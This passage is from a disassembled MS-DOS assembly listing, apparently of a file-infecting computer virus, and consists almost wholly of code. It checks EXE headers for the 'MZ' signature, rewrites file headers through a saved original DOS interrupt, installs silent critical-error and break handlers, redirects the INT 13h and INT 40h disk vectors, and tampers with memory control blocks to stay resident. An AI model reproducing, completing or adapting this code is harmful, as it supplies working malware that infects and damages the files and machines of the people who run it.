                xor     dx,dx                   ; Zero register
                call    sub_20                  ; (086B)
                mov     dx,8EAh
                mov     cx,1Ah
                call    sub_9                   ; (076E)
                jc      loc_69                  ; Jump if carry Set
loc_67:
                cmp     al,al
                jmp     short loc_70            ; (073C)
loc_68:
                mov     al,1
                cmp     al,0
                jmp     short loc_70            ; (073C)
loc_69:
                stc                             ; Set carry flag
loc_70:
                pushf                           ; Push flags
                mov     ah,0Dh
                int     21h                     ; DOS Services  ah=function 0Dh
                                                ;  flush disk buffers to disk
                push    ds
                mov     ax,2513h
                lds     dx,dword ptr data_22    ; (8344:08B3=0) Load 32 bit ptr
                int     21h                     ; DOS Services  ah=function 25h
                                                ;  set intrpt vector al to ds:dx
                mov     al,40h                  ; '@'
                lds     dx,dword ptr cs:data_30 ; (8344:08C3=0) Load 32 bit ptr
                int     21h                     ; DOS Services  ah=function 25h
                                                ;  set intrpt vector al to ds:dx
                pop     ds
                jmp     loc_64                  ; (0662)
sub_5           endp
  
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_7           proc    near
                mov     ax,data_45              ; (8344:08EA=0)
                cmp     ax,5A4Dh
                je      loc_ret_71              ; Jump if equal
                cmp     ax,4D5Ah
  
loc_ret_71:
                retn
sub_7           endp
  
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_8           proc    near
                mov     ah,3Fh                  ; '?'
                call    sub_23                  ; (0879)
                jc      loc_ret_72              ; Jump if carry Set
                cmp     ax,cx
  
loc_ret_72:
                retn
sub_8           endp
  
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_9           proc    near
                mov     ah,40h                  ; '@'
                call    sub_23                  ; (0879)
                jc      loc_ret_73              ; Jump if carry Set
                cmp     ax,cx
  
loc_ret_73:
                retn
sub_9           endp
  
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_10          proc    near
                push    cx
                xor     dx,dx                   ; Zero register
  
locloop_74:
                lodsb                           ; String [si] to al
                add     dl,al
                adc     dh,0
                loop    locloop_74              ; Loop if cx > 0
  
                pop     cx
                retn
sub_10          endp
  
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_11          proc    near
                push    cs
                pop     ds
                mov     si,904h
                mov     bx,ax
                mov     cx,7ABh
                call    sub_7                   ; (0758)
                jnz     loc_75                  ; Jump if not zero
                mov     ax,data_47              ; (8344:08F2=0)
                mov     dx,10h
                mul     dx                      ; dx:ax = reg * ax
                push    bx
                push    di
                call    sub_12                  ; (07BF)
                pop     di
                pop     bx
                mov     si,offset data_45       ; (8344:08EA=0)
                mov     cx,1Ah
                mov     ax,ds:data_54e          ; (8344:10AF=0)
                mov     data_46,ax              ; (8344:08F0=0)
                mov     ax,ds:data_55e          ; (8344:10B1=0)
                mov     data_48,ax              ; (8344:08FE=0)
                mov     ax,ds:data_56e          ; (8344:10B3=0)
                mov     ds:data_49e,ax          ; (8344:0900=0)
loc_75:
                xor     ax,ax                   ; Zero register
                xor     dx,dx                   ; Zero register
  
;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
  
sub_12:
                sub     ax,data_37              ; (8344:08D0=0)
                sbb     dx,data_38              ; (8344:08D2=0)
                jc      loc_76                  ; Jump if carry Set
                jnz     loc_ret_79              ; Jump if not zero
                sub     bx,ax
                jbe     loc_ret_79              ; Jump if below or =
                add     di,ax
                jmp     short loc_77            ; (07E2)
loc_76:
                neg     ax
                adc     dx,0
                neg     dx
                jnz     loc_ret_79              ; Jump if not zero
                sub     cx,ax
                jbe     loc_ret_79              ; Jump if below or =
                add     si,ax
loc_77:
                cmp     cx,bx
                jbe     loc_78                  ; Jump if below or =
                mov     cx,bx
loc_78:
                cld                             ; Clear direction
                rep     movsb                   ; Rep when cx >0 Mov [si] to es:[di]
  
loc_ret_79:
                retn
sub_11          endp
  
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_13          proc    near
                pushf                           ; Push flags
                call    sub_24                  ; (0884)
                mov     ah,49h                  ; 'I'
                push    ds
                pop     es
                int     21h                     ; DOS Services  ah=function 49h
                                                ;  release memory block, es=seg
                mov     ah,49h                  ; 'I'
                mov     es,ds:data_8e           ; (0046:002C=50h)
                int     21h                     ; DOS Services  ah=function 49h
                                                ;  release memory block, es=seg
                mov     ah,50h                  ; 'P'
                mov     bx,ds:data_7e           ; (0046:0016=0)
                int     21h                     ; DOS Services  ah=function 50h
                                                ;  set active PSP segmnt from bx
                mov     ax,2522h
                lds     dx,dword ptr ds:data_6e ; (0046:000A=0) Load 32 bit ptr
                int     21h                     ; DOS Services  ah=function 25h
                                                ;  set intrpt vector al to ds:dx
                call    sub_25                  ; (0896)
                popf                            ; Pop flags
                retn
sub_13          endp
  
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_14          proc    near
                mov     si,dx
                cmp     byte ptr [si],0FFh
                jne     loc_ret_80              ; Jump if not equal
                add     si,7
  
loc_ret_80:
                retn
sub_14          endp
  
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_15          proc    near
                call    sub_24                  ; (0884)
                call    sub_14                  ; (0814)
                push    cs
                pop     es
                mov     dx,904h
                mov     di,dx
                cld                             ; Clear direction
                lodsb                           ; String [si] to al
                or      al,al                   ; Zero ?
                jz      loc_81                  ; Jump if zero
                add     al,40h                  ; '@'
                mov     ah,3Ah                  ; ':'
                stosw                           ; Store ax to es:[di]
loc_81:
                movsw                           ; Mov [si] to es:[di]
                movsw                           ; Mov [si] to es:[di]
                movsw                           ; Mov [si] to es:[di]
                movsw                           ; Mov [si] to es:[di]
                mov     al,2Eh                  ; '.'
                stosb                           ; Store al to es:[di]
                movsw                           ; Mov [si] to es:[di]
                movsb                           ; Mov [si] to es:[di]
                xor     al,al                   ; Zero register
                stosb                           ; Store al to es:[di]
                push    es
                pop     ds
                call    sub_3                   ; (0519)
                call    sub_25                  ; (0896)
                retn
sub_15          endp
  
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_16          proc    near
                push    ax
                mov     ax,cs
                jmp     short loc_82            ; (0854)
  
;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
  
sub_17:
                push    ax
                xor     ax,ax                   ; Zero register
loc_82:
                push    bx
                push    ds
                mov     bx,cs
                dec     bx
                mov     ds,bx
                mov     ds:data_16e,ax          ; (8343:0001=0FFFFh)
                pop     ds
                pop     bx
                pop     ax
                retn
sub_16          endp
  
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_18          proc    near
                mov     ax,3D00h
                jmp     short loc_83            ; (0879)
  
;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
  
sub_19:
                mov     ah,3Eh                  ; '>'
                jmp     short loc_83            ; (0879)
  
;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
  
sub_20:
                mov     ax,4200h
                jmp     short loc_83            ; (0879)
  
;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
  
sub_21:
                mov     ax,4202h
                jmp     short loc_83            ; (0879)
  
;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
  
sub_22:
                push    word ptr [bp+6]
                popf                            ; Pop flags
  
;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
  
sub_23:
loc_83:
                pushf                           ; Push flags
                cli                             ; Disable interrupts
                call    dword ptr cs:data_20    ; (8344:08AB=0)
                retn
sub_18          endp
  
  
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
;
;                       External Entry Point
;
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
  
int_24h_entry   proc    far
                mov     al,3
int_24h_entry   endp
  
  
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
;
;                       External Entry Point
;
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
  
int_23h_entry   proc    far
                iret                            ; Interrupt return
int_23h_entry   endp
  
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_24          proc    near
                pop     cs:data_32              ; (8344:08C7=0)
                push    ds
                push    dx
                push    es
                push    bx
                push    ax
                push    cx
                push    si
                push    di
                push    bp
                mov     bp,sp
                jmp     short loc_84            ; (08A6)
  
;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
  
sub_25:
                pop     cs:data_32              ; (8344:08C7=0)
                mov     sp,bp
                pop     bp
                pop     di
                pop     si
                pop     cx
                pop     ax
                pop     bx
                pop     es
                pop     dx
                pop     ds
loc_84:
                jmp     word ptr cs:data_32     ; (8344:08C7=0)
data_20         dd      00000h
data_21         dd      00000h
data_22         dw      0, 8344h
data_24         dw      0, 8344h
data_26         dw      0, 8344h
data_28         dw      0, 8344h
data_30         dw      0, 8344h
data_32         dw      0
data_33         db      0
data_34         dw      0
data_35         dw      0
data_36         dw      0
data_37         dw      0
data_38         dw      0
data_39         dw      0
                db      12 dup (0)
data_41         dw      0
data_42         dw      0
data_43         dd      00000h
data_45         dw      0
                db      0, 0, 0, 0
data_46         dw      0
data_47         dw      0
                db      10 dup (0)
data_48         dw      0
sub_24          endp
  
  
seg_a           ends
  
  
  
                end     start
